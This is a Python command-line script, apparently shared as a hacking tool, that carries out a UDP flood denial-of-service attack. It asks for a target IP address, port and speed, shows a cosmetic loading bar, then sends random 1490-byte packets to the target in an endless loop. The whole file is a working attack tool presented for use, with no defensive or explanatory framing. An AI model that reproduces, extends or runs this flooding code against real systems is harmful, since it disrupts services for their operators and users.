# python3
#coding:utf-8
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   author          : Wu Yuhang                         |")
print ("|   tool      : DDOS   |")
print ("|   DDOS        : Denial of service attack                      |")
print ("|   version          : V3.6.0                          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[DDOS]----------------- ")
print (" ")
ip = input("please enter IP     : ")
port = int(input("attack port      : "))
sd = int(input("attack speed(1~1000) : "))

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
print (" -----------------[is loaded]----------------- ")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("has been sent %s packets to %s port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)